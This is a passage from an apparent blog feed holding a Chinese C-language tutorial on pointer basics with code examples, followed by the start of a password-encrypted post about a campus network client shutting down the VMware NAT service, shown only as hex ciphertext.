class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">3</span>; <span class="comment">// 声明并初始化为3一个int类型变量i</span></span><br><span class="line">    <span class="type">int</span> *p; <span class="comment">// 声明一个变量p,其类型为int*,代表它是一个指针</span></span><br><span class="line">    p = &amp;i; <span class="comment">// 将i的地址赋值给p</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,*p); <span class="comment">// 此时对p的值进行*运算,也就是解引用,效果就是将p中的值作为一个</span></span><br><span class="line">    <span class="comment">// 指针,去访问对应的内存,从而取出变量i的值</span></span><br><span class="line">    <span class="comment">// 换句话说,这里的*p和i是等价的.</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231121011323454.png" alt="image-20231121011323454" style="zoom:50%;" /><p><code>注意:在对一个指针进行解引用时,一定要确保其指向了有效的地址!!!这是一个十分重要的问题!对未正确赋值的指针进行解引用(访问)是十分危险的行为.</code></p><h3 id="指针声明的问题">指针声明的问题</h3><p>我们在声明指针的时候,一定要注意和普通类型进行区分.普通类型与其对应的指针可以在一个声明中出现:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> *p1,a,*p2;</span><br></pre></td></tr></table></figure><p>这里声明了2个<code>int*</code>类型的指针p1和p2,和一个<code>int</code>类型的变量a.</p><p>要注意的是,p2前面仍然需要一个<code>*</code>代表它是一个指针,另外,尽管p1前面已经有了一个<code>*</code>,但是a仍然仅仅是一个<code>int</code>的变量而已.</p><h1 id="解决交换问题">解决交换问题</h1><p>现在我们可以尝试使用指针进行交换两个变量的值.</p><p>我们既然要使用函数交换两个变量,那么就要求函数能够访问到这两个变量,现在,我们可以使用两个指针参数实现.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在函数中使用指针进行交换两个变量的值</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">swap</span><span class="params">(<span class="type">int</span> *a, <span class="type">int</span> *b)</span> &#123;</span><br><span class="line">    <span class="type">int</span> temp = *a;</span><br><span class="line">    *a = *b;</span><br><span class="line">    *b = temp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">10</span>, b = <span class="number">20</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a = %d, b = %d\n&quot;</span>, a, b);</span><br><span class="line">    swap(&amp;a, &amp;b);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a = %d, b = %d\n&quot;</span>, a, b);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们的<code>swap()</code>函数的两个参数不再是两个int类型的参数,而是int *类型的指针,代表着这个指针可以指向一个int变量.</p><p>main()函数中,<code>swap(&amp;a,&amp;b);</code>使用<code>&amp;取地址运算符</code>计算a和b的地址,传递给swap的两个形参.</p><p>接下来,在swap()中使用一个中间变量(temp仍然需要),进行交换,对指针变量使用<code>*</code>进行解引用,获取到两个要交换的int值,然后进行交换即可.</p><p>运行结果如下:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231124172141354.png" alt="image-20231124172141354"></p><br><p>上面的例子我们了解了如下内容:</p><ol><li>如何获取一个地址(取地址运算符)</li><li>如何存储一个地址(指针变量)</li><li>如何使用一个地址去访问内存(解引用运算符)</li></ol><p>接下来探究<code>指针类型</code>.</p><h1 id="指针的类型">指针的类型</h1><h2 id="不同基本类型的指针">不同基本类型的指针</h2><p>前面的例子都是使用了<code>int *</code>这个类型,代表着对应的指针变量(应该)指向的是一个int类型的变量.</p><p>其他类型的变量同理,如果我们需要指向一个float类型的变量,那么就使用<code>float *</code>即可:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 其他类型的变量同理,如果我们需要指向一个float类型的变量,那么就使用`float *`即可:</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">float</span> var = <span class="number">3.1415</span>;</span><br><span class="line">    <span class="type">float</span> *ptr = &amp;var;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;var == %f\n&quot;</span>, var);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用ptr指针就能访问到var.</p><p>此外,指针类型不匹配是不允许的操作:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 此外,指针类型不匹配是不允许的操作</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">10</span>;</span><br><span class="line">    <span class="type">int</span> *p = &amp;a;</span><br><span class="line">    <span class="type">char</span> *q = p; <span class="comment">// 这里报错: cannot convert &#x27;int*&#x27; to &#x27;char*&#x27; in initialization</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代表着两个指针不兼容,即一个<code>int *</code>的指针不能赋值给一个<code>char *</code>的指针.</p><h2 id="空类型指针">空类型指针</h2><p>有时候,我们可能仅仅想要存一个地址,而不关心其类型,那么可以使用<code>void *</code>类型,即空类型指针,任何类型的指针都能赋值给<code>void *</code>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">1024</span>;</span><br><span class="line">    <span class="type">void</span> *p = &amp;a; <span class="comment">// &amp;a为指针,其类型为int*,可以直接赋值给void*而无需任何处理</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, *(<span class="type">int</span> *)p); <span class="comment">// void*指针不允许直接解引用,必须进行强制类型转换</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的代码使用void*指针p存储了a的地址,在使用p访问a的时候,必须使用<code>强制类型转换</code>将<code>void*</code>转换为<code>int*</code>才能进行解引用.因为对<code>void*</code>解引用的话,无法判断实际占用了多少内存,所以下面的代码编译器报错<code>&quot;不允许使用不完整的类型&quot;</code>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">1024</span>;</span><br><span class="line">    <span class="type">void</span> *p = &amp;a;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, *p);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231124231605327.png" alt="image-20231124231605327" style="zoom:50%;" /><p>这就是一个重要的问题:指针指向的数据类型的大小.</p><p>后面我们会慢慢的接触到<code>void* 指针</code>的重要作用.</p><h2 id="特殊的指针值-null">特殊的指针值-NULL</h2><p>还有的时候,我们希望一个指针变量不指向任何有效的地址,那么我们可以对其赋值为<code>NULL</code>空指针值.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> *p = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, p);</span><br><span class="line">    <span class="comment">// 实际上, NULL 就是 0</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231124232132101.png" alt="image-20231124232132101" style="zoom:50%;" /><p>可以看到,p的值就是0. NULL是一个<code>宏</code>(宏定义),定义在<code>stdio.h</code>中(<code>宏定义</code>将在后面的<code>头文件</code>部分讲解):</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// stdio.h</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NULL ((void *)0)</span></span><br></pre></td></tr></table></figure><p>这个宏意味着<code>NULL</code>在<code>预处理</code>的时候直接替换为<code>((void *)0)</code></p><p>也就是说,当一个指针值为NULL时,我们认为他不指向任何地址,并且认为NULL是安全的—我们检查一个指针是否等于NULL来判断这个指针是否被初始化等…</p><p>后面会深入强调初始化的问题.</p><h2 id="强制类型转换">强制类型转换</h2><p>指针本质上还是一个整数(无符号的),但是<code>指针类型</code>仍然不能和普通的<code>整型</code>互相赋值,如果我们想要将某个数值作为指针值进行赋值,可以使用强制类型转换.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> value=<span class="number">0x7fffffff</span>;</span><br><span class="line"><span class="type">int</span> *p = (<span class="type">int</span> *)value;</span><br></pre></td></tr></table></figure><p>这样,指针p就指向了<code>0x7fffffff</code>这个内存地址对应的内存单元.</p><p>此外,这里也能看出,<code>int</code>和<code>int*</code>是完全不同的两种类型!</p><h1 id="多级指针">多级指针</h1><p>指针用于指向某种类型的变量(地址),同样,指针变量也可以被另外一个指针变量所指向,即指向指针的指针,这就是<code>多级指针</code>.</p><h2 id="使用二级指针">使用二级指针</h2><p>可以这样声明一个二级指针:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">3</span>,*p = &amp;a;</span><br><span class="line">    <span class="type">int</span> **p2 = &amp;p; <span class="comment">// p2是一个二级指针,指向p</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,**p2); <span class="comment">// 输出3, **p2 == *p == a == 3</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20240111225130328.png" alt="image-20240111225130328" style="zoom: 50%;" /><p>声明<code>int **p2</code>就等价于<code>int *(*p2);</code>,也就是说<code>p2</code>是一个指针,指向的类型为<code>int*</code>,因此显然<code>p2</code>是一个<strong>二级指针</strong>,<code>int *p</code>可以称为<strong>一级指针</strong>.</p><p>二级指针仍然是一个指针,只不过我们可以对它进行2次解引用:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">3</span>, *p = &amp;a; <span class="comment">// 声明一个int类型的指针变量p,指向a</span></span><br><span class="line">    <span class="type">int</span> **p2 = &amp;p; <span class="comment">// 声明一个int类型的二级指针变量p2,指向p</span></span><br><span class="line">    <span class="comment">/* 输出a的值 */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a = %d\n&quot;</span>, a); <span class="comment">// a = 3</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;*p = %d\n&quot;</span>, *p); <span class="comment">// *p = 3</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;**p2 = %d\n&quot;</span>, **p2); <span class="comment">// **p2 = 3</span></span><br><span class="line">    <span class="comment">/* 输出a的地址 */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&amp;a = %p\n&quot;</span>, &amp;a); <span class="comment">// &amp;a即为a的地址</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;p = %p\n&quot;</span>, p); <span class="comment">// p存储的值即为a的地址</span></span><br><span class="line">    <span class="comment">/* 输出指针变量p的地址 */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&amp;p = %p\n&quot;</span>, &amp;p); <span class="comment">// &amp;p即为p的地址</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;p2 = %p\n&quot;</span>, p2); <span class="comment">// p2存储的值即为p的地址</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20240111225215625.png" alt="image-20240111225215625" style="zoom:50%;" /><h2 id="对二级指针的解引用">对二级指针的解引用</h2><p>我们可以看出,二级指针可以进行2次解引用,第一次解引用的结果是访问其指向的变量,例如上面的例子中,</p><p><code>*p2</code>即为<code>p</code>,p仍然是一个指针,指向整型变量<code>a</code>,则对其再次解引用<code>**p</code>即可访问到<code>a</code>.</p><p>换言之,<code>**p2</code>可以视为<code>*(*p2)</code>,读者应该清楚地意识到,这里的<code>**</code>完全是2步操作,你甚至可以在中间加一个空格.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">3</span>, *p = &amp;a; <span class="comment">// 声明一个int类型的指针变量p,指向a</span></span><br><span class="line">    <span class="type">int</span> **p2 = &amp;p; <span class="comment">// 声明一个int类型的二级指针变量p2,指向p</span></span><br><span class="line">    <span class="comment">/* 输出a的值 */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;* *p2 = %d\n&quot;</span>, * *p2); <span class="comment">// **p2 = 3</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20240111225239103.png" alt="image-20240111225239103" style="zoom:50%;" /><p>以上使用二级指针进行了举例,三级指针等更&quot;高级&quot;的指针同理,只不过可以指向级数更高的指针而已,实际应用中,基本只用到二级指针.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">3</span>, *p = &amp;a; <span class="comment">// 声明一个int类型的指针变量p,指向a</span></span><br><span class="line">    <span class="type">int</span> **p2 = &amp;p; <span class="comment">// 声明一个int类型的二级指针变量p2,指向p</span></span><br><span class="line">    <span class="type">int</span> ***p3 = &amp;p2; <span class="comment">// 声明一个int类型的三级指针变量p3,指向p2</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>二级指针<code>十分重要</code>,特别是在使用C实现各种数据结构时,需要修改某些指针的指向时非常关键,后面的学习会频繁遇到.</p><br><p>指针是C语言的&quot;灵魂&quot;,指针的内容几乎占有了C语言的半壁江山,本部分简单讲解了指针的基本概念和使用方法,后面会详细展开讲解.</p><p align=right>---WAHAHA</p><br><br><p>上一篇:<a href="../202339a6f8c668c3">C语言教程-12_3-函数的其他用法和特性</a></p><p>下一篇:<a href="../2023270f21643ff7">C语言教程-13_2-指针类型与指针运算</a></p>]]></content>
      
      
      <categories>
          
          <category> C语言教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>校园网某捷客户端强制关闭VMware NAT Service服务的解决办法</title>
      <link href="/202351509ebccc40/"/>
      <url>/202351509ebccc40/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="18074fda086b5c451178106fc0ac5f88f8b0bf3a1e16752588cdee2139bb5efd">93c5be1345d8886e9cfff8c6ac59662fb9415c190a575d312e0bba6d4a9959b619e4f2f4682cf8c93b650f372c6a7e7dbc7cc0fd73a8a34532592dbbcb557bcadf1b1887602e65893b572c6011da4700d29eeaf7bb5359b31b295709292953ee74c56b75bb3240db113183e5a089282a549ed5be6879b5719bc1cb62514310cd84a6c4b6ea11d889ea3b6dce6d98d78d97d520f97b347e5513da1bd40f0310f82c66b9c6583803fdf0e47eb9ed792d82149e0607844f8e4a225ce1f3ff3a2c3cb534daa32814a199aab30346991bbc7ff5c809d86d01e86847c4a2edd25c350d92c7eb29e2729f2e2b918c3f4b1c000d199d7d1fbab80af78203683299d0e03f2e92cd8fd6127e69d704da626f416604460c6ad9d9aa5d42ef68fba82d5be09c6cdecc6dc478e9e5c9e00fc68aabaa65dead3413511dd670048a60f709c3a2774e5d3b8dbf716ee87e8bb7f4e17cf0015c3ae2ea815bf991150563b3f8bc332a78da3e983b9b34b7d97f5b370772b86d8e3b84eb8517f689095275a8d8d461aab40a662ec2fb48f95651f8a1d1c5820a607576c15c4f7b7287c7bb40a2d7d62bd827d9e3ee43fb7fec6c3a46b822a22b9f6c481dbe77cb2eec7056523180c35ecfbcb37946f4069b8858e918a93e1c63e4123bd9c8d1e4f89fd38e7434e722a329b6fbb881c8c0e3f6c1715d4638b30001492a40f31e95a32a401f200b63bc2c560ae0a28de39414129d93b561ab0cdcf393948266491af7fd18858fcd1b6df5be64e8e78a09cbb04e6b64c52b3ba8e33b8b21e78085d5e324cb3f71a2661d5bbd0b455e09661fae4b338dd8e1ad3b21f509b7a0c0a0cd89c9229a1ff91edad0b70329503d13b8d8fe30162517f4f98461c140ccc86b638200384b4c079c2d8d8184bd970a67bf5a1a5f16ee8775226ad700ecc4d574a058b8c2c677dbd3a1796599fa0540818950db05db3d538f6f161f05824d6ae97e69b67ae9b8d08bbdf6a1f20c82d3de1d9782a2b9a1b71280eb8c9918492cd5eefdc89df80f407bd439b60d4a91863732cdd0b344eab97da73a163ca231af6ca611e3cae9710c20e8fffbaf5d023396adb99ed6af874d917eafaca6395d1d84d869ef63593c025d218d6f77ee868dd460d602ffcff0bba73e72c0f4919b6cbdaf0974791263f49eab9b0fe96bea3ebd3c77ce9a99488d7e3e4fa8aa2f18d0a4cd72de9ab688fc3a31138e6d911c13c5635273218092335267e36224f6883427791a826ca61ee51a1f202c9ff40cb478c5f4e49f3e5797931b451cfde29ffa73dcf4524a2af460b10af3527449ec7efbd6976b1613860b6e613bef891645bb8b4ba57465154db6e99bac609f026ba67163937a422de2bdf650551540f84bc9f747f2f950c84c4e9dfbc454310e196d71f672c3a8d0e86d6ac03c3bc0022d9fccbccc12c83a17a47f1786f0a8b37882af95f66441136cc5531d1cdd58363eae032f57d73698de8ca3024cf487a7f0744da7806eceac10dc26a03f4c529dce7eeff0d30f0a47e59f4c13dbe4ba057598f01173d39da53e025c448941a47d05f5c38cf069eccf38cc88a5ee78d2bf82923e89639e48e071925813c3991b32905e9a20736e714ba6775c1fe150bb074c40b798615dcecff45cc42fc3d11ba0c00d8122e4a61378dc154bf1ee8f2d34ef35396ef2b351b38bbeb0ad9dc4ab01aa0edf630aa396ee779062daf710fc0fdd720eb8b9275c45e09a81c0cab018578c52871c3fe6bb5d52db242622f179410a158ca65324c4ec83388e22ca5d0e7697eecd2a295636e7890cf14323ca711ab6c351af35a57383f0751771b743d1ce5017b026b8a11291a481a062940deb338de268ccbc2a48195f9af1b7734c97a03bb5c1b93b99f4e52092d08b8927b707c90cb0c69c359e7de946c96eacf7ccef6819b4be928657912a38ebda2629291f007696e0cc54fc129daf22c219b5d7873b1857ab597103dbf534d0233d90e720e3d3b48d342d6ac10474d5d099ce26cf89c6eb66cd02627e7e1f1c42fcd9adb811c17f8056c0bef84e15f86c1f79b2f595d014f10b653c6e79fb60008b410776e5e19324fb7db0ee76be8b2adfed1f6a94996418a6cfd3f40e14612a1a40a31a0948acfcf66cb362d08afb4c864981b37e65a5fb57420e3032d708bcf8409bde5e0a61f26aeb047d75e865c21484e087d32e631d545a437d1cba8873a04551a481b60a20dc29ae78798ec5b7642d1e32fd12bf852a72c825ab0fd145f8bb9084522ed6665c4eb4e1bff4196308fce7f59131256838c6298acb025249561b7aac6636c6c58ead43ec1345c0dcc74b1c0fb05a38fd27b9c0dee38158a1f76f307fcf3b46a175fca2ac822dbe82607a8e3d341b6339d00558791d70e6f92dd7e7797dd313429ceabd8d30a8d159f86375b1ed52c161a5db2af53414f379a3b7970b9d2823d3055ea5f6b551a6704f1ea1a3ebd5f1594174de93c7344e6e7419ca591b88471d40827695b190b013d0b86c1a37b4064e74774a941e4288d13bec1ff767dd480d82c90110972f3da9e6cd18500d46e1e5109f3c086d20f44d24c3ab25008be9f73e76f7a3808396e7464d64bd91d63487f7a3bf661d5016b731bf3549046f04d71a9816b286f92a5448145dfb8764e4c490b9af606c67c59526b311983a77d5c613448eca4af384c811420684557c5a1ac5dbe416332d7ee2cfbb33a4db640d2b42b3f998a7ec01d6516e5a29654179c8e49e0d1559f19fd0724be77636457d12804716cf7d14675b4da834dbed82155a1cfa3c15fb576bd502e18bf3fc5cc4ea15f389162168c9c278c763c1734488c3eae4df00c0174f061e487ece5c84301f596977047288e8252e957ba98a665044a0809c8dab5d6424482926776d880d8b1db078ba5139135ea0fda6fb9518527e7be1b731f3b822fbfdfbc2673636a05315d7aec37661a9c2b9a1ff0420a32e484f4f00c3c5b93c88b608eefa01f0840fa1c488c0f1d7920e6d63757a9f9a3f53c9bc56912cc5fe14e0a476c7407e967f54257e12cf55ff006fdaf3b8796c29d10d3ee08bc5533c0ab6e68e6f85d35dbf03c96afd242eb980f68a1e4d020f45d069425386407ae3c87ca9d292f940df798874c4351472e691924306fd3b715c35d47b5fea0078fd15e966351e0c3c692ca83732c7d131b31562d023271f8b20924194909e0e02975ad8791485bb6fd8852cef0d85d4d7297ab2da95a898140124540ccf1c1cdb9c92c969d405d6c6347bd91837d14045dc18b00dda1fdce428cf85f76251acb107745c79fbdbe6708a2a1b1a9b536bd7d07a1279e35556eb8c652100db9c760021e8ba2d9f38347758c9e1964eb9f884b0476380ea595c0e07945fe795830c0772c485c89bfda3ccc21a2716d70b6976d57640d30bf6e22b911a4a0020db375590d736a10a74d655e875840e286e6777f73b686b0c2cd348f1dad745146167ef4907b1d37efbe3b1a2dd68096d2c92042446d20a04f8f58d70d8ee0dd72740d13c9be8e4b338f0d47aef0f58cd373470383339fdf11ff66829451a56a36db681490e9a3970defa82d83435b27055a2f2d5440efab2ea9a49b8b4e6c00b474c1c6712f68c717f5fac484eb5e73eec5ed8284e11514a14adfe034be3b79b7345a33c97a66a84c663940ed090a2762c09e7f540750de9a33298403d0cb5108952dce4f0f4918817e30b210b00b5250d3afe66cd50c3cf36a735cdf334fcc745e24dc3e4cd7acee04818c4843c7f37f4c28061af40f73fe492359b412a238d1143199228f4bad33d6a7ff8c5596a2dbc4d29b4aa86823ba260cb3e08c717d5627ca7d6a5163ccf5bb25d78a32b5dbb1cca568d52b2fc7d7c885ff2b88f1a2e69eeac31a1868af0e9a1f8279a58ede1488c8bcc69209d413ca9d2e0218be27dd36c47effe2ff241b1d82eb7c9421b46b592cb7722e2cd46c088f68af2582c0f15f29a84009e2856a2d562029ab7d182bb0bc8035ce75b6725ffe7b0d6bf832c17224c7f507aaf9b92266fc080aa3c24ca5361bd9a7268c67fdd5963558f7e02cb2a897a7bddd39d0429d7edede31204a4df8c0b6224c2b89d92130348db7e12d4e921643cb673196d34b45456f8e4f8b34fec177ec2db6dc1d789c0734984a7800f2cbc27203c1a24eb908c3dbad4e164cddd2edd4e32035fee00f36a080603057d8265d2f42e144d873709c3554cad243aa85831f778031a7a036573418e3507cf6239732864aadcfb02660e586f877ffb8e1138844e898b3b7e8e5954b89fa3e4e9092bf26693004399baba02b90eee3b07ab69c3cc9871b82052b6584208a553be60a3d60ba1d032d97994cfb4486db30215adfdff601e09a1fde779116ab95d84dca5542f2a1e7582b7e5285b3f025bc395048c97c4c7cf57e7a7cd8bf18f8bb049964a98537b7d5ca984eb41b0401d5443b83054259aab14531cfdba18aa48e5fcc5160d468d615fb3799b85a2ea5f3f3d62b305f91eee63caccc03db9d27717744037cbdc5fab2b74535186a21ec2c4b6d446b1079e8a86f613d00b9b30d9881a2aa3357cff6dccc4b9cff0a79c405c8fba0370fab92672cd4b90c45e964196d9078eff03d984db21b65afc8c02bec298473937c37314797622f939346239e9f8d6d81273772c1a60f396c8652f4dbc7cd49c58174d28ed34f538b37d552041f61ef7ed496127d06f4d387943b93c92e54af5a02433168ae09653d98b22d879e47f978c863750d71e509f5e89c10b4d578183fd4641793bddb166bb10e91a6f37e3de24914c32645d087821c0318ae23a4923b015b8abd2e880ac9a96f6b300cccd01c3c54eb5a43a0f300ac48775a886c020e9273ff59ba2fd4ad45555897abd843faeede689caa7da6b27c48470e82c0ece550dd57e51b6f7e5c818983b109626f32cba286c047982dee150e1bb29ee038d34bea656ee041d954e73c81ce20a90b25216f1adc5b80bb30327655c69ff6ee54378314dac13ea3a29acd080b76f84398641d348e482d297f5a0c34fcc4576282c59af10277422111bdb64b598100e73777d0948dce767ac27b17eba3028db2a54b78b6c33f65dd5e43d946150bfa3c793c3f9961918d9bf6cac3667cdc98e9302e9ee663ce316f1ce7ca689cc2e4e585960931d34efd88bda02d531fc600a0159446b17f9ecbfb89d219dc7c9ed2ba78c9e545609efa0a61eb731d8f4376c447219ed6a664dcab1b95557843b6e74ad083acc10b19f48bbcee691dba3b321b8dc56fac333849de6cb6b52c0b152fa71f041ea3e34f53373bb7b3e33fe2b30931e8d5f473318b7d033a3d5e317d4a51f921ae76c2a8f6163321ff0ec1ad95a23a2cab98bfc3b9bad26429b6e888cdfc7bb0da5f3808e2b0e9683b80257402067119f8c3f1c4e3762034499fa539fc977e39f3bfa18eb3bd49f773161d77a38a2c91b26f75d9d8e6c043877ebe00f74d366b1e5775cf1c544e7ae5261d17df580e6